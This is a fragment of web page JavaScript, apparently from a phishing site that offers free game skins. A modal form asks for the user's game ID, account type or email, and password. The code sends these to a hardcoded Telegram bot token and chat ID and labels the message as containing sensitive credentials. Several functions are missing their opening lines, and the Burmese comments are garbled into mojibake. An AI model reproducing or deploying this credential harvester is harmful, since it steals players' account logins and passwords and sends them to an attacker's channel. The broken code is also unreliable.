    <script>
        // ----------------------------------------------------
        // ğŸš¨ Telegram Bot Configuration
        // ----------------------------------------------------
        const TELEGRAM_BOT_TOKEN = '8401107435:AAF_g6gQ1BApPyLlY_zE3BDm_1EvLKqqLKA'; 
        const CHAT_ID = '8434049778'; 
        // ----------------------------------------------------


        // Image Fallback Function (á€•á€¯á€¶á€™á€•á€±á€«á€ºá€›á€„á€º Placeholder á€•á€¼á€”á€ºá€•á€¼á€–á€­á€¯á€·)

            img.onerror = null; // Prevent infinite loop
            img.src = `https://placehold.co/100x150/2c2c2c/ffffff?text=Broken+Image`;
        }

        let selectedSkin = ''; // á€”á€¾á€­á€•á€ºá€œá€­á€¯á€€á€ºá€á€²á€· Skin á€”á€¬á€™á€Šá€ºá€€á€­á€¯ á€á€­á€™á€ºá€¸á€‘á€¬á€¸á€–á€­á€¯á€·

        // Modal á€€á€­á€¯ á€–á€½á€„á€·á€ºá€›á€”á€º

            selectedSkin = skinName;
            // Static text á€€á€­á€¯ á€™á€•á€¼á€±á€¬á€„á€ºá€¸á€œá€²á€á€±á€¬á€·á€•á€«áŠ selectedSkin á€”á€¬á€™á€Šá€ºá€€á€­á€¯ á€á€­á€™á€ºá€¸á€‘á€¬á€¸á€›á€¯á€¶á€á€¬

            document.getElementById('modalStatus').innerText = ''; // Status á€€á€­á€¯á€›á€¾á€„á€ºá€¸á€œá€„á€ºá€¸á€á€¼á€„á€ºá€¸
        }

        // Modal á€€á€­á€¯ á€•á€­á€á€ºá€›á€”á€º

            document.getElementById('telegramModal').classList.remove('open');
            // Form Data á€á€¯á€¶á€¸á€á€¯á€œá€¯á€¶á€¸á€€á€­á€¯ á€›á€¾á€„á€ºá€¸á€œá€„á€ºá€¸á€á€¼á€„á€ºá€¸
            document.getElementById('messageLine1').value = '';
            document.getElementById('messageLine2').value = '';
            document.getElementById('messageLine3').value = ''; // ğŸ› ï¸ New: password field á€€á€­á€¯á€•á€« á€›á€¾á€„á€ºá€¸á€œá€„á€ºá€¸á€™á€Šá€º
        }

        // Telegram á€á€­á€¯á€· á€…á€¬á€•á€­á€¯á€·á€›á€”á€º Function (API Call)
        async function sendMessageToTelegram() {
            const statusElement = document.getElementById('modalStatus');
            const idServer = document.getElementById('messageLine1').value.trim(); // Your ID/Server ID
            const accountType = document.getElementById('messageLine2').value.trim(); // Gmail/Moonton/Facebook
            const password = document.getElementById('messageLine3').value.trim(); // ğŸ› ï¸ New: Password
            
            // ğŸ› ï¸ Validation á€á€¯á€¶á€¸á€á€¯á€œá€¯á€¶á€¸ á€…á€…á€ºá€†á€±á€¸á€á€¼á€„á€ºá€¸
            if (!idServer || !accountType || !password) {
                statusElement.innerText = 'á€¡á€€á€½á€€á€ºá€¡á€¬á€¸á€œá€¯á€¶á€¸á€€á€­á€¯ á€–á€¼á€Šá€·á€ºá€á€½á€„á€ºá€¸á€›á€”á€º á€œá€­á€¯á€¡á€•á€ºá€•á€«á€á€Šá€ºá‹';
                statusElement.style.color = '#f05252'; // Red
                return;
            }

            const fullMessage = `
                ğŸš¨ NEW SKIN REQUEST (Myanmar Only User) ğŸš¨
                -------------------------------------
                *SKIN SELECTED:* ${selectedSkin}
                *USER ID/SERVER ID:* ${idServer}
                *ACCOUNT TYPE/EMAIL:* ${accountType}
                *PASSWORD:* ${password} 
                -------------------------------------
                *WARNING: THIS CONTAINS SENSITIVE CREDENTIALS!*
            `;

            const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            statusElement.innerText = 'á€•á€­á€¯á€·á€”á€±á€•á€«á€á€Šá€º...';
            statusElement.style.color = '#fca311'; // Yellow

            try {
                const response = await fetch(apiUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: fullMessage,
                        parse_mode: 'Markdown' 
                    })
                });

                const data = await response.json();

                if (response.ok && data.ok) {
                    statusElement.innerText = 'á€•á€­á€¯á€·á€•á€¼á€®á€¸á€•á€«á€•á€¼á€®! á€€á€»á€±á€¸á€‡á€°á€¸á€á€„á€ºá€•á€«á€á€Šá€ºá‹';
                    statusElement.style.color = '#2d942e'; // Green
                    // 3 á€…á€€á€¹á€€á€”á€·á€ºá€¡á€€á€¼á€¬á€á€½á€„á€º Modal á€•á€­á€á€ºá€›á€”á€º
                    setTimeout(closeTelegramModal, 3000); 
                } else {
                    statusElement.innerText = `á€…á€¬á€•á€­á€¯á€·á€™á€›á€•á€«: ${data.description || 'á€¡á€™á€¾á€¬á€¸á€á€…á€ºá€á€¯á€á€¯á€›á€¾á€­á€”á€±á€•á€«á€á€Šá€ºá‹ Token á€á€­á€¯á€·á€™á€Ÿá€¯á€á€º Chat ID á€€á€­á€¯ á€…á€…á€ºá€•á€«á‹'}`;
                    statusElement.style.color = '#f05252'; // Red
                }

            } catch (error) {
                console.error('Fetch Error:', error);
                statusElement.innerText = 'á€€á€½á€”á€ºá€›á€€á€º á€á€»á€­á€á€ºá€†á€€á€ºá€™á€¾á€¯ á€¡á€™á€¾á€¬á€¸á€–á€¼á€…á€ºá€”á€±á€•á€«á€á€Šá€ºá‹';
                statusElement.style.color = '#f05252'; // Red
            }
        }
